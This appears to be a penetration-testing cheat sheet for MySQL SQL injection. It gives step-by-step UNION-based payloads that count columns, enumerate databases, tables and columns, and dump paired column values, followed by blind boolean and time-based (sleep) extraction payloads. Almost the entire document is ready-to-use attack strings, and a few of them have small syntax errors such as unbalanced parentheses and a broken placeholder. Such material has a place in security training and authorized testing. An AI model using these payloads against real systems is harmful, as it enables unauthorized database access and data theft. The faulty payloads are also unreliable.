# MySQL Injection

## UNION Based

### Step 1. Number of columns

```bash
# First method:
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' etc.
# Second method:
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
# etc.
```

### Step 2. List columns on the web

```bash
' UNION SELECT 'a',NULL,NULL,NULL-- -
' UNION SELECT NULL,'a',NULL,NULL-- -
' UNION SELECT NULL,NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,NULL,'a'-- -
```

### Step 3. Show databases

{% hint style="danger" %}
Remember to use a column where the result is displayed.
{% endhint %}

```sql
# DBs:
' ## View the name of the current database.
' UNION SELECT database(), NULL-- -
' ## Names of all databases:
' union select schema_name, NULL from information_schema.schemata-- -
' union select (select group_concat(SCHEMA_NAME SEPARATOR '\n') FROM information_schema.schemata),2,3-- -
' ## We are changing the limit: limit 0,1 - limit 1,1 - limit 2,1:
' union select schema_name, NULL from information_schema.schemata limit 0,1-- -
```

### Step 4. Tables and columns

```sql
# Tables:
## View all tables in all databases:
' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables-- -
'
## To see all the tables of all the databases (indicates me to which DB belongs that table):
' UNION select table_name,table_schema, NULL,NULL,NULL from INFORMATION_SCHEMA.TABLES-- -
' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='<NAME DB>'-- -
## We are changing the limit: limit 0,1 - limit 1,1 - limit 2,1:
' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema="<NAME DB>" limit 0,1-- -
'
## Bypass in hexadecimal:
echo -n "School" | xxd -ps
... where table_schema=0x5363686f6f6c-- -

# Columns:
' UNION SELECT column_name, NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name="<TABLE NAME>" limit 0,1-- -
' UNION SELECT column_name, NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_schema="<DATABASE NAME>" and table_name="<TABLE NAME>" limit 0,1-- -
```

### Step 5. Dump info

```sql
' UNION SELECT <COLUMN NAME>,NULL,NULL,NULL,NULL FROM <TABLE NAME>-- -
' UNION SELECT <COLUMN NAME>,NULL,NULL,NULL,NULL FROM <DB NAME>.<TABLE NAME>-- -
# Concatenate 2 columns into 1 (0x3a means ":" in hex):
' UNION SELECT concat(<COLUMN NAME>,0x3a,<COLUMN NAME>),NULL,NULL,NULL,NULL FROM <DB NAME>.<TABLE NAME>-- -
' UNION SELECT group_concat(<COLUMN NAME>,0x3a,<COLUMN NAME>),NULL,NULL,NULL,NULL FROM <DB NAME>.<TABLE NAME>-- -
' UNION SELECT concat(<COLUMN NAME>,0x3a,<COLUMN NAME>),NULL,NULL,NULL,NULL FROM <DB NAME>.<TABLE NAME> limit 0,1-- -
```

## BLIND Based

### Boolean

{% tabs %}
{% tab title="Method 1" %}
```sql
' Syntax:
' AND SUBSTR((<QUERY> LIMIT {j},1),{i},1)='{character}'-- -
' # DBs:
' AND SUBSTR((SELECT schema_name FROM information_schema.schemata LIMIT {j},1),{i},1)='{character}'-- -
' # Tables:
' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='<DB NAME>' LIMIT {j},1),{i},1)='{character}'-- -
' # Columns:
' AND SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema='<DB NAME>' AND table_name='<TABLE NAME>' LIMIT {j},1),{i},1)='{character}'-- -
' # Dump:
' AND SUBSTR((SELECT concat(<COLUMN1>,0x3a,<COLUMN2>) FROM <DB NAME>.<TABLE NAME> LIMIT {j},1),{i},1)='{character}'-- -
```
{% endtab %}

{% tab title="Method 2" %}
```sql
' Syntax:
' AND ascii(SUBSTR(<QUERY> LIMIT {j},1),{i},1))='{character}'-- -
' # DBs: 
' AND ascii((SUBSTR(SELECT schema_name FROM information_schema.schemata LIMIT {j},1),{i},1))='{character}'-- -
' # Tables:
' AND ascii((SUBSTR(SELECT table_name FROM information_schema.tables WHERE table_schema='<DB NAME>' LIMIT {j},1),{i},1))='{character}'-- -
' # Columns:
' AND ascii((SUBSTR(SELECT column_name FROM information_schema.columns WHERE table_schema='<DB NAME>' AND table_name='<TABLE NAME>' LIMIT {j},1),{i},1))='{character}'-- -
' # Dump:
' AND ascii((SUBSTR(SELECT concat(<COLUMN1>,0x3a,<COLUMN2>) FROM <DB_NAME>.<TABLE_NAME> LIMIT {j},1),{i},1))='{character}'-- -
```
{% endtab %}
{% endtabs %}

### Time

{% tabs %}
{% tab title="Method 1" %}
```sql
' # Syntax:
' AND (SELECT sleep(10) FROM dual where SUBSTR((<QUERY> limit {j},1),{i},1) = '{character}')-- -
' # DBs:
' AND (SELECT sleep(10) FROM dual where SUBSTR((select schema_name from information_schema.schemata limit {j},1),{i},1) = '{character}')-- -
' # Tables:
' AND (SELECT sleep(10) FROM dual where SUBSTR((select table_name from information_schema.tables WHERE table_schema='<DB_NAME>' limit {j},1),{i},1) = '{character}')-- -
' # Columns:
' AND (SELECT sleep(10) FROM dual where SUBSTR((select column_name from information_schema.columns WHERE table_schema='<DB_NAME>' AND table_name='<TABLE_NAME>' limit {j},1),{i},1) = '{character}')-- -
' # Dump:
' AND (SELECT sleep(10) FROM dual where SUBSTR((select concat(<COLUMN1>,0x3a,<COLUMN2>) from <DB_NAME.<TABLE_NAME> limit {j},1),{i},1) = '{character}')-- -
```
{% endtab %}

{% tab title="Method 2" %}
```sql
' # Syntax:
' AND (SELECT sleep(10) FROM dual where ascii(SUBSTR((<QUERY> limit {j},1),{i},1)) = '{character}')-- -
' # DBs: 
' AND (SELECT sleep(10) FROM dual where ascii(substr((select schema_name from information_schema.schemata limit {j},1),{i},1))={character})-- -
' # Tables:
' AND (SELECT sleep(10) FROM dual where ascii(substr((select table_name from information_schema.tables WHERE table_schema='<DB_NAME>' limit {j},1),{i},1))={character})-- -
' # Columns:
' AND (SELECT sleep(10) FROM dual where ascii(substr((select column_name from information_schema.columns WHERE table_schema='<DB_NAME>' AND table_name='<TABLE_NAME>' limit {j},1),{i},1))={character})-- -
' # Dump:
' AND (SELECT sleep(10) FROM dual where ascii(substr((select concat(<COLUMN1>,0x3a,<COLUMN2>) from <DB_NAME>.<TABLE_NAME> limit {j},1),{i},1))={character})-- -
```
{% endtab %}
{% endtabs %}
